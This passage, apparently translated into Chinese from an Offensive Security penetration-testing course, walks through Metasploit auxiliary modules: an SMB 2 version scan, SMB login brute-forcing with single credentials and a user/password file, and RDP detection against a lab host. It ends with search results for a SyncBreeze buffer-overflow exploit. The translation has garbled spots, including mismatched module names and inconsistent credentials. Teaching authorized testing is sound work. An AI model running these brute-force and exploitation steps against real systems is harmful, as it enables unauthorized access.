
# 使用 Kali Linux 2.0 进行渗透测试

选项：

`-h`

`-o <file>`

`-S <string>`

显示此帮助信息

将输出以 csv 格式发送到文件

用于行过滤的搜索字符串

- 关键字：

  - `aka` 具有匹配别名（also-known-as）名称的模块

  - `author` 由此作者编写的模块

  - `arch` 影响此架构的模块

  - `bid` 具有匹配 Bugtrag ID 的模块

  - `cve` 具有匹配 CVE ID 的模块

- `target` 影响此目标的模块

  - `type` 特定类型的模块（利用程序、载荷、编码器、逃逸）

示例：

`search cve:2089 type:exploit`

```
msf5 > search type:auxiliary name:smb
匹配的模块
```

| 名称 | 评级 | 描述 |

|---|---|---|

| auxiliary/admin/oracle/ora_ntl_stealer | normal | Oracle SMB 继攻击执行 |

| auxiliary/admin/smb/check_dir_file | normal | SMB 扫描检查文件/目录 |

| auxiliary/admin/smb/delete_file | normal | SMB 文件删除工具 |

| auxiliary/admin/smb/download_file | normal | SMB 文件下载工具 |

756 - 搜索 SMB 辅助模块

在用 `use` 调用模块后，我们可以按照以下方式请求其更多信息：

```
msf5 > use scanner/smb/smb2
msf5 auxiliary(scanner/smb/smb2) > info
```

> 名称: SMB 2.0 协议检测

模块: auxiliary/scanner/smb/smb2

许可证: Metasploit Framework 许可证 (BSD)

评级: Normal

提供者：

hdm <xhdm.io>

检查支持：

是

| 名称 | 当前设置 | 是否需要 | 描述 |

|---|---|---|---|

| RHOSTS | | 是 | 目标地址范围或 CIDR 标识符 |

| RPORT | 445 | 是 | 目标端口 (TCP) |

| THREADS | 1 | 是 | 并发线程数 |

PWK 2.0

版权 © Offensive Security Ltd. 版留所有权利。

# OFFENSIVE SECURITY

使用 Kali Linux 2.0 进行渗透测试

描述：

检测支持 SMB 2.0 协议的系统

> 列表 747 - 显示 SMB 模块的信息

`info` 输出的模块描述告诉我们，`smb2` 模块目的是检测远程机器是否支持 SMB 2.0 协议。可以通过执行 `show options` 命令检查模块的基本选项参数。对于此特定模块，我们需要设置目标的 IP 地址，在这里是我们的 Windows 10 机器。

或者，由于我们已经扫描了 Windows 10 机器，可以在 Metasploit 数据库中搜索 TCP 端口 445 的主机（`services -p 445`），并额外结果添加到 `RHOSTS` (`-rhosts`)

```
msf5 auxiliary(scanner/smb_version) > services -p 445 --rhosts
```

服务

======

| 主机 | 端口 协议 | 名称 状态 | 信息 |

|---|---|---|---|---|

| 10.11.0.22 | 445 | tcp | microsoft-ds | 开启 | () |

```
RHOSTS => 10.11.0.22
```

```
msf5 auxiliary(scanner/smb_version) >
```

> 列表 748 - 从利用程序加载 IP 地址

配置好必需参数后，我们可以用 `run exploit` 启动模块：

```
msf5 auxiliary(scanner/smb_2) > run
```

[ [+] 10.11.0.22:445 - 10.11.0.22:100 支持 SMB 2 [方言 255] 已在线

[+] 扫描了 1 个主机 (100% 完成)

[+] 辅助模块执行完成

> 列表 749 - 运行辅助模块

根据该模块，远程计算机确实支持 SMB 版本 2。为了利用这一点，我们可以使用 `scanner/smb_login` 模块尝试对机器进行暴力破解登录。该模块和选项列表产生了以下内容：

```
msf5 auxiliary(scanner/smb_enum_domains) > use scanner/smb_login
```

```
msf5 auxiliary(scanner/smb_login) > options
```

模块选项 (auxiliary/smb_login):

| 名称 | 当前设置 | 是否需要 | 描述 |

|---|---|---|---|

| ABORT_ON_LOCKOUT | false | | 发生账户锁定时中止 |

| BLANK_PASSWORDS | false | | | 为所有用户尝试空密码 |

| BRUTEFORCE_SPEED | 5 | | 暴力破解速度，从 0 到 5 |

| DB_CREDS | false | | | 存储在用户名/密码对 |

| DB_PASS | false | | | 添加当前数据库中的所有密码 |

| DB_ALL_USERS | false | | | 添加当前数据库中的所有用户 |

| DETECT_ANY_AUTH | false | | | 检测接受认证的系统 |

| DETECT_ANY_DOMAIN | false | | | 检测是否需要域 |

| PASS_FILE | | | | 包含密码的文件，每行一个 |

| PRESER_DOMAINS | true | | | 包含域的用户名 |

| Proxies | false | | | 主机:端口代理链 |

| RECORD_GUEST | false | | | 记录来宾登录 |

| RHOSTS | | 是 | 规格的目标地址或 CIDR 标识符 |

| RPORT | 445 | 是 | SMB 服务 (TCP) |

| SMBDomain | | | | 用于认证的域 |

| SMBPass | | | | 指定用户使用的密码 |

| SMBUser | | | | 用于身份验证的用户名 |

| STOP_ON_SUCCESS | false | | | 成功时停止 |

| THREADS | 1 | 是 | 并发线程数 |

| USERPASS_FILE | | | | 包含用户和密码的文件 |

| USER_AS_PASS | false | | | 为所有用户尝试密码 |

| USER_FILE | | | | 包含用户的文件，每行一个 |

| VERBOSE | true | | | 是否输出所有尝试 |

列表 750 - smb_login 的列表

该输出接受参数（如 `RHOSTS`）和可选参数（如 `SMBDomain`）。注意，尽管我们在之前的 SMB 模块中设置了 `RHOSTS`，但该模块没有设置。它仅在运行的模块范围内设置。我们可以设置一个适用于所有模块的全局参数。

可以更改的一个辅助参数是 `THREADS`。它告诉框架在运行模块时启动多少线程。我们不希望运行太快，但稍微增加会显著缩短时间。

为了演示，假设我们已经发现了有效的凭据。我们想确定这些凭据是否可以在 TCP 端口 445 开启的服务器上重用。为了方便，我们将在无效密码的客户端尝试这种方法。我们将提供有效的域 `corp.com`、有效的用户名 (`Offsec`)、无效密码 (`ABCDEF23`) 以及 Windows 10 的 IP 地址：

```
msf5 auxiliary(scanner/smb_login) > set SMBDomain corp.com
SMBDomain => corp.com

msf5 auxiliary(scanner/smb_login) > set SMBUser Offsec
SMBUser => Offsec

msf5 auxiliary(scanner/smb_login) > set SMBPass ABCDEF23!
SMBPass => ABCDEF23!

msf5 auxiliary(scanner/smb_login) > set RHOSTS 10.11.0.22
RHOSTS => 10.11.0.22
```

# OFFENSIVE SECURITY

使用 Kali Linux 2.0 进行渗透测试

```
msf5 auxiliary(scanner/smb_login) > set THREADS 10
THREADS => 10
```

```
msf5 auxiliary(scanner/smb_login) > run
```

```
[+] 10.11.0.22:445 - 10.11.0.22:445 - 开始 SMB 暴力登录
[*] 10.11.0.22:445 - 10.11.0.22:445 - 该系统不接受认证
[-] 10.11.0.22:445 - 10.11.0.22:445 - 失败: 'corp.com@Offsec:ABCDEF23!',
[+] 扫描了 1 个主机 (100% 完成)
[*] 辅助模块执行完成
```

列表 751 - 尝试 SMB 登录

由于我们知道提供了密码，登录如预期失败了。现在，尝试提供一个有效密码并重新运行模块。

```
msf5 auxiliary(scanner/smb_login) > set SMBPass Querty09!
SMBPass => Querty09!
```

```
msf5 auxiliary(scanner/smb_login) > run
```

```
[+] 10.11.0.22:445 - 10.11.0.22:445 - 开始 SMB 暴力登录
[*] 10.11.0.22:445 - 10.11.0.22:445 - 该系统不接受认证
[*] 10.11.0.22:445 - 10.11.0.22:445 - 成功: 'corp.com@Offsec:Querty09!'
[+] 扫描了 1 个主机 (100% 完成)
[*] 辅助模块执行完成
```

列表 752 - 使用有效凭据尝试 SMB 登录

这次身份验证成功了。我们可以从凭据中检索成功的登录。

```
msf5 > creds
Credentials==
```

| 主机 | 源 | 服务 | 公有 | 私有类型 |

|---|---|---|---|

| 10.11.0.22 | 10.11.0.22 | 445/tcp (microsoft-ds) | Offsec Querty09! | corp.com Password |

列表 753 - 列出所有发现的凭据

尽管这次运行成功，但它无法扩展。为了测试具有多种密码的用户群，可以使用 `USERPASS_FILE` 参数，它指示模块使用一个由空格分隔的用户密码的文件，每行一对。

```
msf5 auxiliary(scanner/smb_login) > set USERPASS_FILE /home/kali/users.txt
USERPASS_FILE => /home/kali/users.txt
```

```
msf5 auxiliary(scanner/smb_login) > run
```

```
[+] 10.11.0.22:445 - 10.11.0.22:445 - 开始 SMB 暴力登录
[-] 10.11.0.22:445 - 10.11.0.22:445 - 失败: '.\bob:querty09!',
[-] 10.11.0.22:445 - 10.11.0.22:445 - 失败: '.\bob:password',
[-] 10.11.0.22:445 - 10.11.0.22:445 - 失败: '.\alice:querty09!',
[-] 10.11.0.22:445 - 10.11.0.22:445 - 失败: '.\alice:password',
```

# 使用 Kali Linux 2.0 进行渗透测试

```
[+] 10.11.0.22:445 - Success: '\offsec!Qwerty9'
[*] 10.11.0.22:445 - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

列表 754 - 使用用户名和密码对 SMB 登录进行暴力破解

让我们尝试另一个例子。在这个例子中，我们将尝试识别监听在 TCP 端口 3389 的机器，这可能表明它们运行着远程桌面协议 (RDP) 连接。为此，我们将调用 `scanner/rdp/rdp_scanner`。

```
msf5 auxiliary(scanner/smb_login) > use scanner/rdp/rdp_scanner
```

```
msf5 auxiliary(scanner/rdp/rdp_scanner) > show options
```

模块选项 (auxiliary/scanner/rdp/rdp_scanner):

| Name | Current Setting | Required | Description |

|---|---|---|---|

| CredSSP | true | yes | 是否请求 CredSSP |

| EarlyUser | false | yes | 是否提供 Early User Authorization Re |

| RHOSTS | | yes | 目标范围或 CIDR 标识符 |

| RPORT | 3389 | yes | 目标端口 (TCP) |

| THREADS | 1 | yes | 并发线程数 |

| TLS | true | | 是否请求 TLS 安全 |

```
msf5 auxiliary(scanner/rdp/rdp_scanner) > set RHOSTS 10.11.0.22
```

```
msf5 auxiliary(scanner/rdp/rdp_scanner) > run
```

```
[+] 10.11.0.22:3389 - Detected RDP on 10.11.0.22:3389
[*] 10.11.0.22:3389 - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

列表 755 - 识别远程桌面协议端点

该模块成功检测到在一个主机上运行的 RDP，并自动将结果添加到数据库中。

## 22.1.3.1 练习

- 1. 启动 postexpl 并启动 `msfconsole`。

2. 使用 SMB、HTTP 以及任何其他辅助模块扫描实验室系统。

3. 在数据库中查看主机信息。

## 22.2 利用模块

现在我们已经熟悉了 MSF 的基本用法和几个辅助模块，让我们深入研究 MSF 的核心部分：利用模块（`exploit modules`）。

利用模块通常包含针对漏洞应用程序和服务的利用代码。在本文期间，Metasploit 包含超过 1700 个漏洞，经过了精心开发和测试，能够成功利用各种漏洞服务。这些漏洞的调用方式与辅助模块相似。

## 22.2.1 SyncBreeze Enterprise

为了开始探索利用模块，我们将关注一个我们反复利用过的服务：SyncBreeze。在本节中，我们将在 Windows 10 工作站上搜索与 SyncBreeze 企业应用程序相关的漏洞，然后使用 MSF 对其利用。首先，我们使用 `search` 命令：

```
msf5 > search syncbreeze
Matching Modules
===========
Name Disclosure Date Rank Description
--- -------------------- ----- -----------------
exploit/windows/fileformat/syncbreeze_xml 2017-03-29 normal Sync Breeze Enterprise 9.5.16 -- Import Command Buffer Overflow
exploit/windows/http/syncbreeze_b 2017-03-15 great Sync Breeze Enterprise GET Buffer Overflow
```

输出显示了两个特定的利用模块。我们将关注 10.0.28 并请求该特定模块的 `info` 信息：

```
msf5 > info exploit/windows/http/syncbreeze_b
Name: Sync Breeze Enterprise GET Buffer Overflow
Module: exploit/windows/http/syncbreeze_bof
Platform: Windows
Arch:
Privileged: Yes
License: Metasploit Framework License (BSD)
Rank: Great
Disclosed: 2017-03-15
```

提供者：

- Daniel Teixeira

- Andrew Smith

- Owais Mehtab

- Milton Valencia (wetwork)

可用目标：

| Id | Name |

|---|---|

| 0 | Automatic |

| 1 | Sync Breeze Enterprise v9.4.28 |

| 2 | Sync Breeze Enterprise v10.0.28 |
